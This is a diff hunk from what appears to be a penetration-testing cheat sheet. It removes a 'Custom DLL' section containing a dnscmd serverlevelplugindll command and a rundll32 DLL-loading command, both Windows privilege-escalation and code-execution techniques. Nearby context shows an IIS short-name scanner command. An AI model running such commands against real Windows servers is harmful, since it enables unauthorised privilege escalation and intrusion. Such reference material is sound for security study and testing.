@@ -1186,13 +1186,6 @@ https://github.com/irsdl/IIS-ShortName-Scanner
 $ java -jar iis_shortname_scanner.jar 0 5 http://<IP addresss>/
 ```
 
-- Custom DLL
-
-```
-C:\> dnscmd.exe /config /serverlevelplugindll adduser.dll
-C:\> rundll32 shell32.dll,Control_RunDLL C:\Users\<username>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
-```
-
 #4. - Lateral Movement
 -----------------------------------------
 
